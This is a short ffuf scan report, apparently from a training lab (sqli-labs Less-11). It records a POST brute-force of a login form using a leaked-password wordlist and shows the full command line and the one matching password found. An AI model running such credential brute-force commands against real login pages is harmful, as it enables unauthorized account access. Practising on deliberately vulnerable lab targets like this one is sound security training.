# FFUF Report

  Command line : `ffuf -u http://10.10.254.142/sqli-labs/Less-11/ -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d uname=Dummy&amp;passwd=FUZZ&amp;submit=Submit -o user_password_discovery_ffuf_scan.md -of md -v -c -fs 1435 -H Content-Type: application/x-www-form-urlencoded`
  Time: 2021-11-24T17:30:57-05:00

  | FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | ResultFile |
  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- |
  | p@ssword | http://10.10.254.142/sqli-labs/Less-11/ |  | 774 | 200 | 1526 | 100 | 50 | text/html; charset=UTF-8 |  |
  